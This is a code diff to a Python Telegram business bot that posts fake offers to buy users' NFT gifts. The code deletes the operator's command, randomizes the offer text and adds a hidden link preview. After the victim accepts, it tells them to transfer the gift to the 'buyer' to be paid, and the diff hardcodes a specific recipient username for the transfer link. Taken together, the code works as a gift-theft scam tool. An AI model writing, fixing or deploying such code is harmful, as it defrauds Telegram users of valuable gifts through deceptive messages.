@@ -18,7 +18,7 @@ from aiogram.types import (
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=USERNAME")
+NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=dobrks")
 STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5242644275014951846")
 GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5193179982775476271")
 CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
@@ -235,7 +235,10 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
 @dp.business_message(F.text.startswith("+rep "))
 async def cmd_rep_business(message: types.Message):
     args = message.text.split()
+    
+    # ИСПРАВЛЕНИЕ: Добавлен лог, чтобы видеть причину срабатывания удаления
     if len(args) < 3:
+        print(f"[DEBUG] Ошибка: слишком мало аргументов в команде -> {message.text!r}")
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
@@ -244,15 +247,19 @@ async def cmd_rep_business(message: types.Message):
         except Exception:
             pass
         return
+
     nft_arg = args[1]
     amount = args[2]
     currency = args[3].strip().lower() if len(args) > 3 else "stars"
     lang = get_lang(args[4] if len(args) > 4 else "ru")
+    
     try:
         nft_name, nft_num, nft_url = parse_nft_input(nft_arg)
         nft_num_formatted = format_amount(str(nft_num))
         nft_full_name = f"{nft_name} #{nft_num_formatted}"
-    except ValueError:
+    except ValueError as e:
+        # ИСПРАВЛЕНИЕ: Логируем ошибку парсинга ссылки/названия подарка
+        print(f"[DEBUG] Ошибка парсинга NFT аргумента '{nft_arg}': {e}")
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
@@ -261,10 +268,12 @@ async def cmd_rep_business(message: types.Message):
         except Exception:
             pass
         return
+
     t = TEXTS[lang]
     amount_formatted = format_amount(amount)
     currency_text = mask_stars(currency)
     order_id = f"TG-{uuid.uuid4().hex[:10].upper()}"
+    
     offers[order_id] = {
         "order_id": order_id,
         "nft_url": nft_url,
@@ -276,6 +285,7 @@ async def cmd_rep_business(message: types.Message):
         "business_connection_id": message.business_connection_id,
         "chat_id": message.chat.id,
     }
+    
     offer_text_raw = t['offer_template'].format(
         buyer="@@BUYER@@",
         amount="@@AMOUNT@@",
@@ -284,15 +294,18 @@ async def cmd_rep_business(message: types.Message):
     offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
     nft_name_rand = randomize_all(nft_full_name, probability=1.0)
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
+    
     offer_text = (
         offer_text_rand
         .replace("@@BUYER@@", BUYER_NAME)
         .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
         .replace("@@NFT@@", nft_link)
     )
+    
     expires_rand = randomize_all(t['offer_expires'], probability=1.0)
     preview_line = f'<a href="{nft_url}">&#8203;</a>'
     text = f"{preview_line}{offer_text}\n\n{expires_rand}"
+    
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -306,9 +319,10 @@ async def cmd_rep_business(message: types.Message):
             parse_mode="HTML",
             business_connection_id=message.business_connection_id,
         )
-        print(f"[OFFER] sent lang={lang}")
+        print(f"[OFFER] Успешно отправлено! Язык: {lang}")
     except Exception as e:
-        print(f"[SEND ERROR] {e}")
+        print(f"[SEND ERROR] Ошибка отправки сообщения: {e}")
+        
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -328,14 +342,17 @@ async def process_accept(callback: CallbackQuery):
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
     nft_name_rand = randomize_all(offer['nft_name'], probability=1.0)
+    
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
         "us": f"Offer to sell {offer['nft_name']} has been successfully accepted.\n\nTransfer the gift to the buyer to receive {offer['amount']} {currency_text} to your balance.",
         "ua": f"Пропозицію щодо продажу {offer['nft_name']} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {offer['amount']} {currency_text} на ваш баланс."
     }
     await callback.answer(alert_texts.get(lang, alert_texts["ru"]), show_alert=True)
+    
     nft_link = f'<a href="{offer["nft_url"]}">{nft_name_rand}</a>'
     preview_line = f'<a href="{offer["nft_url"]}">&#8203;</a>'
+    
     if lang == "ru":
         text = (
             f"{preview_line}{gift_emoji()} Подарок: <b>{nft_link}</b> успешно продан!\n\n"
@@ -354,6 +371,7 @@ async def process_accept(callback: CallbackQuery):
             f"• <b>Transfer the gift to the buyer to receive "
             f"{currency_text}.</b>"
         )
+        
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -401,8 +419,8 @@ async def process_confirm(callback: CallbackQuery):
     await callback.answer()
 
 @dp.business_message()
-async def debug_business(message: types.Message):
-    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")
+async def debug_business(text: types.Message):
+    pass
 
 async def main():
     print("Бот запущен (Business Mode)...")
